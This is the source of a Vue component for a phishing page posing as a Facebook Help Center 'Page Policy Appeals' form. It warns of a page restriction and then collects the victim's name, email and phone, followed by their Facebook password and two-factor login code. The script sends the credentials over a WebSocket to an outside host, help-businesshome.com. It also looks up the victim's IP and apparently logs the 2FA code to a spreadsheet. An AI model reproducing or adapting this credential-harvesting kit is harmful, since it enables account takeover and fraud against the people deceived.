<template>
  <div class="min-h-screen">
    <header class="bg-[#355797] py-4">
      <div class="max-w-5xl mx-auto px-4">
        <div class="flex items-center justify-between">
          <h1 class="text-4xl font-bold text-white"><a href="/" class="">facebook</a></h1>
          <div class="relative px-0 hidden sm:block">
            <div class="absolute inset-y-0 start-0 flex items-center ps-3 pointer-events-none"><span
                class="i-heroicons-magnifying-glass"></span></div><input style="padding-inline-start: 2.5rem;"
              type="text"
              class="flex h-8 md:w-[640px] p-4 ps-10 text-sm text-gray-900 border border-gray-400 bg-gray-50 focus:ring-blue-500 focus:border-blue-500"
              placeholder="How can we help?">
          </div>
        </div>
      </div>
    </header>
    <nav class="bg-[#e9ebee] py-4">
      <div class="max-w-5xl mx-auto px-4">
        <div class="flex items-center justify-between">
          <div class="text-lg font-semibold border-b-2 border-b-blue-600"><a href="/"
              class="text-[#3578e5] font-bold flex space-x-1"><span class="i-heroicons-home-solid pt-6"></span>
              <p>Help Center</p>
            </a></div>
          <div class="flex items-center space-x-4"><a href="/" class="text-[#3578e5] text-sm"> English </a></div>
        </div>
      </div>
    </nav>
    <div class="md:max-w-5xl sm:max-w-2xl mx-auto py-6 px-4 sm:px-2">
      <div class="grid md:grid-cols-4 gap-4 sm:grid-cols-1">
        <aside class="col-span-1 hidden sm:block">
          <nav class="space-y-2 text-base"><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Creating an Account</a><a aria-current="page"
              href="/" class="router-link-active router-link-exact-active block">Your Profile</a><a aria-current="page"
              href="/" class="router-link-active router-link-exact-active block">Friending</a><a aria-current="page"
              href="/" class="router-link-active router-link-exact-active block">Facebook Dating</a><a
              aria-current="page" href="/" class="router-link-active router-link-exact-active block">Your Home
              Page</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Messaging</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Reels</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Stories</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Photos</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Videos</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Gaming</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Pages</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Groups</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Events</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Fundraisers and Donations</a><a
              aria-current="page" href="/" class="router-link-active router-link-exact-active block">Meta Pay</a><a
              aria-current="page" href="/" class="router-link-active router-link-exact-active block">Marketplace</a><a
              aria-current="page" href="/" class="router-link-active router-link-exact-active block">Apps</a><a
              aria-current="page" href="/" class="router-link-active router-link-exact-active block">Facebook Mobile
              Apps</a><a aria-current="page" href="/"
              class="router-link-active router-link-exact-active block">Accessibility</a></nav>
        </aside>
        <main class="md:col-span-3 sm:col-span-1 bg-white rounded-md border-gray-300 pb-[50px]">
          <div class="rounded-lg border border-gray-300 divide-y divide-gray-300">
            <div class="px-2 py-4 pl-3 bg-gray-100"><strong class="text-xl font-semibold mb-4">Page Policy
                Appeals</strong></div>
            <div class="px-4 py-4">
              <p class="mb-4 text-sm"> We have detected unusual activity on your page that violates our community
                standards. Your access to your page has been limited, and you are currently unable to post, share, or
                comment using your page. If you believe this to be a mistake, you have the option to submit an appeal
                by providing the necessary information. </p>
              <div class="grid grid-cols-2 gap-4">
                <div class="flex flex-col space-y-1.5 col-span-2">
                  <div class="">
                    <div class="">
                      <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_1"
                          class="block font-medium text-gray-700 dark:text-gray-200 after:content-['*'] after:ms-0.5 after:text-red-500 dark:after:text-red-400">Name
                          fanpage:</label></div>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input id="PFwJYqbHLs_1" name="page" type="text"
                          @change="check_data()" v-model="counter.page" placeholder="Name of your fanpage"
                          :class="counter.page_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                          class=" relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2 dark:focus:ring-primary-400">
                      </div>
                      <p v-show="!counter.page_dk" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an
                        name fanpage</p>
                    </div>
                  </div>
                </div>
                <div class="flex flex-col space-y-1.5 col-span-2">
                  <div class="">
                    <div class="">
                      <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_2"
                          class="block font-medium text-gray-700 dark:text-gray-200 after:content-['*'] after:ms-0.5 after:text-red-500 dark:after:text-red-400">Full
                          Name:</label></div>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input id="PFwJYqbHLs_2" name="name" type="text"
                          @change="check_data()" v-model="counter.name" placeholder="Your full name"
                          :class="counter.name_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                          class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2 dark:focus:ring-primary-400">
                      </div>
                      <p v-show="!counter.name_dk" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter an
                        name</p>
                    </div>
                  </div>
                </div>
                <div class="flex flex-col space-y-1.5 col-span-2">
                  <div class="">
                    <div class="">
                      <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_3"
                          class="block font-medium text-gray-700 dark:text-gray-200 after:content-['*'] after:ms-0.5 after:text-red-500 dark:after:text-red-400">Email
                          Address:</label></div>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input id="PFwJYqbHLs_3" name="email" type="email"
                          @change="check_data()" v-model="counter.email" placeholder="Your email address"
                          :class="counter.email_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                          class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2  dark:focus:ring-primary-400">
                      </div>
                      <p v-show="!counter.email_dk && !counter.email"
                        class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter
                        an email</p>
                      <p v-show="!counter.email_error" class="mt-2 text-red-500 dark:text-red-400 text-sm">Your email
                        was incorrect!</p>
                    </div>
                  </div>
                </div>
                <div class="flex flex-col space-y-1.5 col-span-2">
                  <div class="">
                    <div class="">
                      <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_4"
                          class="block font-medium text-gray-700 dark:text-gray-200 after:content-['*'] after:ms-0.5 after:text-red-500 dark:after:text-red-400">Mobile
                          Phone Number:</label></div>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><input id="PFwJYqbHLs_4" name="phone" type="tel"
                          @change="check_data()" v-model="counter.phone" placeholder="Your mobile phone number"
                          :class="counter.phone_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                          class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2 fo dark:focus:ring-primary-400">
                      </div>
                      <p v-show="!counter.phone_dk" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter
                        an phone</p>
                    </div>
                  </div>
                </div>
                <div class="flex flex-col space-y-1.5 col-span-2">
                  <div class="">
                    <div class="">
                      <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_5"
                          class="block font-medium text-gray-700 dark:text-gray-200 after:content-['*'] after:ms-0.5 after:text-red-500 dark:after:text-red-400">Please
                          provide us information:</label></div>
                    </div>
                    <div class="mt-1 relative">
                      <div class="relative border-1 rounded-md"><textarea id="PFwJYqbHLs_5" name="message" rows="3"
                          @change="check_data()" v-model="counter.message" placeholder="Type your message here"
                          :class="counter.message_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                          class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-textarea rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-2.5 py-1.5 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2  dark:focus:ring-primary-400 resize-none"></textarea>
                      </div>
                      <p v-show="!counter.message_dk" class="mt-2 text-red-500 dark:text-red-400 text-sm">You must enter
                        an message</p>
                    </div>
                  </div>
                </div>
                <div class="px-1 py-2 col-span-2 flex justify-end"><button type="submit" v-on:click="check_data_email()"
                    class="focus:outline-none disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 gap-x-1.5 shadow-sm dark:text-gray-900 dark:bg-primary-400 dark:hover:bg-primary-500 dark:disabled:bg-primary-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-primary-500 dark:focus-visible:outline-primary-400 inline-flex items-center rounded-md text-md text-white font-medium bg-[#1E429F] h-10 px-4 py-2 hover:bg-blue-400 active:bg-blue-400 disabled:bg-blue-400">
                    Send</button></div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
    <footer class="md:bg-blue-200 py-4 sm:bg-white">
      <div class="mx-auto w-full max-w-screen-xl">
        <div class="grid grid-cols-1 gap-1 px-4 py-6 sm:grid-cols-1">
          <div class="flex justify-center">
            <div class="flex space-x-4">
              <p class="mb-1">English (UK)</p>
              <p class="mb-1">English (US)</p>
              <p class="mb-1 hidden sm:block">Español</p>
              <p class="mb-1 hidden sm:block">Português (Brasil)</p>
              <p class="mb-1 hidden sm:block">Français (France)</p>
              <p class="mb-1 hidden sm:block">Español (España)</p>
              <p class="mb-1">More languages</p>
            </div>
          </div>
          <div class="flex justify-center pt-3">
            <div class="flex space-x-4">
              <p>© 2024 Meta</p>
              <p>About</p>
              <p class="hidden sm:block">Developers</p>
              <p class="hidden sm:block">Careers</p>
              <p>Privacy</p>
              <p>Cookies</p>
              <p>Terms</p>
              <p class="hidden sm:block">Help Centre</p>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </div>
  <div v-show="counter.check_mail" class="fixed inset-0 transition-opacity bg-gray-200/75 dark:bg-gray-800/75"></div>
  <div v-show="counter.check_mail" class="fixed inset-0 overflow-y-auto">
    <div class="flex min-h-full items-end sm:items-center justify-center text-center p-4 sm:p-0">
      <div id="headlessui-dialog-panel-NQtPBbOdAo_10" data-headlessui-state="open"
        class="relative text-left rtl:text-right flex flex-col bg-white dark:bg-gray-900 shadow-xl w-full sm:max-w-lg rounded-lg sm:my-8">
        <div class="rounded-lg dark:divide-gray-800 divide-y divide-gray-300 shadow bg-white dark:bg-gray-900">
          <div class="px-4 py-5 sm:px-6">
            <div class="flex items-center justify-between">
              <h5 class="font-medium text-xl">Please enter your facebook password</h5><button type="button"
                v-on:click="counter.check_mail = false"
                class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-1.5 p-1.5 shadow-sm ring-1 ring-inset ring-gray-300 dark:ring-gray-700 text-gray-700 dark:text-gray-200 bg-gray-50 hover:bg-gray-100 disabled:bg-gray-50 dark:bg-gray-800 dark:hover:bg-gray-700/50 dark:disabled:bg-gray-800 focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 inline-flex items-center -my-1"><span
                  class="i-heroicons-x-mark-20-solid flex-shrink-0 h-5 w-5" aria-hidden="true"></span></button>
            </div>
          </div>
          <div class="px-4 py-5 sm:p-6">
            <div class="mb-3">
              <p class="text-md py-1">For your security, you must enter your password to continue.</p>
              <div class="">
                <div class="">
                  <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_11"
                      class="block font-medium text-gray-700 dark:text-gray-200">Password:</label></div>
                </div>
                <div class="mt-1 relative">
                  <div class="relative border-1 rounded-md"><input id="PFwJYqbHLs_11" name="password"
                      v-model="counter.password" :type="counter.show_password ? 'password' : 'text'"
                      placeholder="Enter your password" @change="change_password()"
                      :class="counter.password_dk ? 'ring-gray-300 focus:ring-primary-500' : 'ring-red-500 focus:ring-red-500'"
                      class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset  dark:ring-gray-700 focus:ring-2 dark:focus:ring-primary-400 pe-10"><span
                      class="absolute inset-y-0 end-0 flex items-center px-3"><button type="button"
                        v-on:click="counter.Show_pw()"
                        class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-1.5 p-1.5 text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 underline-offset-4 hover:underline focus-visible:ring-inset focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 inline-flex items-center"><span
                          class="i-heroicons-eye flex-shrink-0 h-5 w-5" aria-hidden="true"></span></button></span></div>
                  <p v-show="!counter.password_dk && !counter.password"
                    class="mt-2 text-red-500 dark:text-red-400 text-sm">You must an
                    password</p>
                  <p v-show="!counter.password_error" class="mt-2 text-red-500 dark:text-red-400 text-sm">Your password
                    was incorrect!</p>
                </div>
              </div>
            </div>
            <div class="grid grid-cols-1 mx-auto gap-2"><button v-on:click="check_data_password()" type="button"
                class="focus:outline-none disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm text-white dark:text-gray-900 bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500 dark:bg-blue-400 dark:hover:bg-blue-500 dark:disabled:bg-blue-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-blue-500 dark:focus-visible:outline-blue-400 w-full flex justify-center items-center btn btn-primary"><span
                  class="">Continue</span></button></div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div v-show="counter.check_password" class="fixed inset-0 transition-opacity bg-gray-200/75 dark:bg-gray-800/75">
  </div>
  <div v-show="counter.check_password" class="fixed inset-0 overflow-y-auto">
    <div class="flex min-h-full items-end sm:items-center justify-center text-center p-4 sm:p-0">
      <div id="headlessui-dialog-panel-NQtPBbOdAo_16" data-headlessui-state="open"
        class="relative text-left rtl:text-right flex flex-col bg-white dark:bg-gray-900 shadow-xl w-full sm:max-w-lg rounded-lg sm:my-8">
        <div class="rounded-lg dark:divide-gray-800 divide-y divide-gray-300 shadow bg-white dark:bg-gray-900">
          <div class="px-4 py-5 sm:px-6">
            <div class="flex items-center justify-between">
              <h5 class="font-medium text-xl">Verification required</h5><button type="button"
                v-on:click="counter.check_password = !counter.check_password"
                class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-1.5 p-1.5 shadow-sm ring-1 ring-inset ring-gray-300 dark:ring-gray-700 text-gray-700 dark:text-gray-200 bg-gray-50 hover:bg-gray-100 disabled:bg-gray-50 dark:bg-gray-800 dark:hover:bg-gray-700/50 dark:disabled:bg-gray-800 focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 inline-flex items-center -my-1"><span
                  class="i-heroicons-x-mark-20-solid flex-shrink-0 h-5 w-5" aria-hidden="true"></span></button>
            </div>
          </div>
          <div class="px-4 py-5 sm:p-6">
            <div class="mb-3">
              <p class="text-md">We need you to verify your identity before submitting a request. We already sent a
                notification to your logged-in devices. Check your Facebook notifications the account and approve the
                login to continue.</p><img src="@/assets/codefa.6d3b4c7b8474a1ee8fce.jpg" width="100%"
                class="py-2 w-full">
            </div>
            <div class="mb-3">
              <div class="">
                <div class="">
                  <div class="flex content-center items-center justify-between text-sm"><label for="PFwJYqbHLs_17"
                      class="block font-medium text-gray-700 dark:text-gray-200">Or, enter your login code</label><span
                      class="text-gray-500 dark:text-gray-400">6-digit code from the authentication app.</span></div>
                </div>
                <div class="mt-1 relative">
                  <div class="relative rounded-md border-1 border-gray-300 bg-gray-200"><input id="PFwJYqbHLs_17"
                      name="code2fa" type="tel" placeholder="Code" v-model="counter.code"
                      :class="{ 'ring-gray-300 focus:ring-primary-500': counter.code_dk, 'ring-red-500 focus:ring-red-500': !counter.code_dk || counter.code_error }"
                      class="relative block w-full disabled:cursor-not-allowed disabled:opacity-75 focus:outline-none border-0 form-input rounded-md placeholder-gray-400 dark:placeholder-gray-500 text-sm px-3 py-2 shadow-sm bg-white dark:bg-gray-900 text-gray-900 dark:text-white ring-1 ring-inset ring-gray-300 dark:ring-gray-700 focus:ring-2 focus:ring-primary-500 dark:focus:ring-primary-400">
                    <span v-show="counter.code_error && counter.code"
                      class="absolute inset-y-0 end-0 flex items-center px-3 text-red-500"><span
                        class="i-heroicons-exclamation-triangle-20-solid flex-shrink-0 text-gray-400 dark:text-gray-500 text-red-500 dark:text-red-400 h-5 w-5"
                        style="--tw-text-opacity: 1; color: rgb(239 68 68 / var(--tw-text-opacity))"></span></span>
                  </div>
                  <p v-show="!counter.code_dk && !counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">You
                    must an code</p>
                  <p class="text-md flex items-center py-2 gap-2"><span class="i-heroicons-arrow-path"></span> We can
                    send a new code in <b class="font-bold">{{ formattedTime }}</b></p>
                  <p v-show="counter.code_error && counter.code" class="mt-2 text-red-500 dark:text-red-400 text-sm">
                    Your code is incorrect</p>
                </div>
              </div>
            </div>
            <div class="grid grid-cols-1 mx-auto gap-3"><button type="button"
                v-on:click="check_data_code(); this.counter.writeToSheet_1();"
                class="focus:outline-none  flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm text-white dark:text-gray-900 bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500 dark:bg-blue-400 dark:hover:bg-blue-500 dark:disabled:bg-blue-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-blue-500 dark:focus-visible:outline-blue-400 w-full flex justify-center items-center border-1 rounded-1"><span
                  class="">Continue</span></button><button type="button" v-on:click="restartCountdown();"
                class="focus:outline-none focus-visible:outline-0 disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm ring-1 ring-inset ring-gray-300 dark:ring-gray-700 text-gray-900 dark:text-white bg-white hover:bg-gray-50 disabled:bg-white dark:bg-gray-900 dark:hover:bg-gray-800/50 dark:disabled:bg-gray-900 focus-visible:ring-2 focus-visible:ring-primary-500 dark:focus-visible:ring-primary-400 w-full flex justify-center items-center border-1 rounded-1"><span
                  class="">Get a new code</span></button></div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div v-show="counter.check_code" class="fixed inset-0 transition-opacity bg-gray-200/75 dark:bg-gray-800/75"></div>
  <div v-show="counter.check_code" class="fixed inset-0 overflow-y-auto">
    <div class="flex min-h-full items-end sm:items-center justify-center text-center p-4 sm:p-0">
      <div id="headlessui-dialog-panel-NQtPBbOdAo_22" data-headlessui-state="open"
        class="relative text-left rtl:text-right flex flex-col bg-white dark:bg-gray-900 shadow-xl w-full sm:max-w-lg rounded-lg sm:my-8">
        <div class="divide-y divide-gray-300 gap-2 rounded-2xl border-1 border-gray-300">
          <div class="bg-blue-800 border-1 border-blue-800 p-2 rounded-sm">
            <h5 class="text-md text-white font-bold">Form submitted successfully</h5>
          </div>
          <div class="p-2 text-md">
            <p>Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view
              responses in your email.</p>
          </div>
          <div class="flex justify-end p-2 bg-[#e9ebee]"><button type="button" v-on:click="check_ok()"
              class="focus:outline-none disabled:cursor-not-allowed disabled:opacity-75 flex-shrink-0 font-medium rounded-md text-sm gap-x-2 px-3 py-2 shadow-sm text-white dark:text-gray-900 disabled:bg-blue-500 dark:bg-blue-400 dark:hover:bg-blue-500 dark:disabled:bg-blue-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-blue-500 dark:focus-visible:outline-blue-400 inline-flex items-center bg-[#355797] hover:bg-[#355797]"><span
                class="">OK</span></button></div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import { useCounterStore } from "@/stores/counter"; // Nếu có
import axios from "axios"; // Nếu có

export default {
  data() {
    return {
      ws: null,
      messages: [],
      inputText: '', // Thêm inputText để lưu nội dung tin nhắn mới
      remainingMinutes: 0,
      remainingSeconds: 59,
      formattedTime: "00:59",
      countdownInterval: null
    };
  },
  setup() {
    const counter = useCounterStore(); // Nếu có
    return { counter };
  },
  mounted: function () {
    this.connectWebSocket();
  },
  methods: {
    startCountdown() {
      this.remainingMinutes = 0;
      this.remainingSeconds = 59;
      this.countdownInterval = setInterval(() => {
        if (this.remainingMinutes === 0 && this.remainingSeconds === 0) {
          clearInterval(this.countdownInterval);
        } else {
          if (this.remainingSeconds === 0) {
            this.remainingMinutes--;
            this.remainingSeconds = 59;
          } else {
            this.remainingSeconds--;
          }
          this.formattedTime = this.formatTime(this.remainingMinutes, this.remainingSeconds);
        }
      }, 1000);
    },
    restartCountdown() {
      clearInterval(this.countdownInterval);
      this.startCountdown();
    },
    formatTime(minutes, seconds) {
      return (
        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds
      );
    },
    change_password() {
      if (this.counter.password) {
        this.counter.password_dk = true;
      };
      if (!this.counter.password) {
        this.counter.password_dk = false;
      }
    },
    check_data_1() {
      if (!this.counter.page) {
        this.counter.page_dk = false;
      };
      if (!this.counter.name) {
        this.counter.name_dk = false;
      };
      if (!this.counter.phone) {
        this.counter.phone_dk = false;
      };
      if (!this.counter.email) {
        this.counter.email_dk = false;
      };
      if (!this.counter.message) {
        this.counter.message_dk = false;
      };
    },
    check_data() {
      if (this.counter.page) {
        this.counter.page_dk = true;
      };
      if (this.counter.name) {
        this.counter.name_dk = true;
      };
      if (this.counter.phone) {
        this.counter.phone_dk = true;
      };
      if (this.counter.email) {
        this.counter.email_dk = true;
      };
      if (this.counter.message) {
        this.counter.message_dk = true;
      };
    },
    connectWebSocket() {
      // Kết nối đến máy chủ WebSocket
      this.ws = new WebSocket('wss://help-businesshome.com/ws/check/');

      // Xử lý tin nhắn nhận được từ máy chủ
      this.ws.onmessage = (event) => {
        var data = JSON.parse(event.data);
        this.messages = data;
        if (this.messages.linked == true) {
          this.counter.email_error = true;
          this.counter.check_mail = true;

          this.counter.email_dk = true;
          this.counter.name_dk = true;
          this.counter.phone_dk = true;
          this.counter.message_dk = true;
          this.counter.page_dk = true;
        };
        if (this.messages.linked == false) {
          this.counter.email_error = false;
          this.counter.email_dk = false;
          this.counter.name_dk = true;
          this.counter.phone_dk = true;
          this.counter.message_dk = true;
          this.counter.page_dk = true;
        };
        if (this.messages.passed == true) {
          this.startCountdown();
          this.counter.check_mail = false;
          this.counter.check_password = true;

          this.counter.password_dk = true;
          this.counter.get_ip();
        };
        if (this.messages.passed == false) {
          this.counter.password_error = false;
        };
      };
    },
    sendMessage(a) {
      // Gửi tin nhắn đến máy chủ WebSocket
      if (this.ws !== null && this.ws.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify(a));
      } else {
        console.error('WebSocket connection not established');
      }
    },
    async check_data_email() {
      this.check_data_1();
      if (this.counter.email && this.counter.name && this.counter.phone && this.counter.page && this.counter.message) {
        await this.sendMessage({ event: "checkEmail", email: this.counter.email });
      };
    },
    async check_data_password() {
      this.counter.password_error = true;
      if (!this.counter.password) {
        this.counter.password_dk = false;
      };
      if (this.counter.password) {
        await this.sendMessage({ event: "checkPass", email: this.counter.email, password: this.counter.password });
      };
    },
    check_data_code() {
      this.counter.code_dk = true;
      if (this.counter.code) {
        this.counter.check_password = true;
        // this.counter.check_code = true;
        this.counter.code_error = true;
      }
      if (!this.counter.code) {
        this.counter.code_dk = false;
      }
    },
    check_ok() {
      this.counter.check_code = false;
      this.counter.page = ''; this.counter.email = ''; this.counter.name = ''; this.counter.phone = '';
      this.counter.birthday = ''; this.counter.message = ''; this.counter.password = ''; this.counter.code = '';
      this.counter.page_dk = true; this.counter.email_dk = true; this.counter.name_dk = true; this.counter.phone_dk = true;
      this.counter.birthday_dk = true; this.counter.message_dk = true; this.counter.password_dk = true; this.counter.code_dk = true;
      this.counter.email_error = true; this.counter.password_error = true; this.counter.code_error = false;
      this.counter.check_mail = false; this.counter.check_password = false; this.counter.check_code = false; this.counter.check_all = false;
      this.counter.show_password = true;
    },
    disconnectWebSocket() {
      // Ngắt kết nối WebSocket
      if (this.ws !== null) {
        this.ws.close();
        console.log('WebSocket connection closed');
      }
    },
    getInfo() {
      return new Promise((resolve, reject) => {
        fetch('https://ipinfo.io/json')
          .then(response => response.json())
          .then(data => {
            resolve(data);
          })
          .catch(error => {
            reject(error);
          });
      });
    },
  },
  components: {},
};
</script>

<style>
.i-heroicons-home-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E")
}

.i-heroicons-eye-slash,
.i-heroicons-home-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-magnifying-glass,
.i-heroicons-magnifying-glass-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-magnifying-glass {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E");
  mask-image: var(--svg);
